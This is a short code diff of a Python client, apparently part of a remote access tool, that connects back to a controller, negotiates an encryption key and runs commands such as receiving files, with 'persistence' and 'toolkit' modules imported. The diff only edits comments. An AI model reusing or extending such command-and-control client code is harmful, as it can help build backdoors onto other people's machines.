@@ -17,6 +17,7 @@ from core import filesock
 from core import persistence
 from core import toolkit
 
+
 PLATFORM = sys.platform
 HOST     = 'localhost'
 PORT     = 1337
@@ -30,8 +31,6 @@ def main():
     s.connect((HOST, PORT))
 
     DHKEY = crypto.diffiehellman(s)
-    # debug: confirm DHKEY matches
-    # print binascii.hexlify(DHKEY)
 
     while True:
         data = s.recv(1024)
@@ -65,8 +64,7 @@ def main():
                 fname = fname.strip()
                 filesock.recvfile(s, fname, DHKEY)
 
-        # regenerate DH key (dangerous! may cause connection loss)
-        # available in case a fallback occurs or you suspect evesdropping
+        # regenerate DH key
         elif cmd == 'rekey':
             DHKEY = crypto.diffiehellman(s)
 
